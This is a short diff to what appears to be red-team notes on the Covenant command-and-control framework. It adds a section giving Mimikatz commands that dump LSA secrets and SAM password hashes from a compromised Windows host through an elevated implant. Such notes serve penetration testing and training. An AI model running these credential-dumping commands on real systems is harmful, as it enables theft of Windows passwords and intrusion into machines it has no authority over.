@@ -53,6 +53,13 @@
   - Verify the kill date of the launcher
   - the UI may not allow changing the date.  This can be fixed by deleting the `/opt/Covenant/Covenant/data/covenant.db` file and restarting the service. You will lose all data and need to create a new user to log in with.
 
+## Dump hashes with mimikatz
+
+- In a high grunt
+- We can use this to see if any plaintext info might come out `Mimikatz token::elevate lsadump::secrets`
+- Will dump the sam file (where password hashes are stored in windows)`Mimikatz token::elevate lsadump::sam`
+- Covenant will save tge Crendentials in the Data section as well
+
 ## Resources
 
 {% embed url="https://github.com/cobbr/Covenant" %} Get Covenant here {% endembed %}
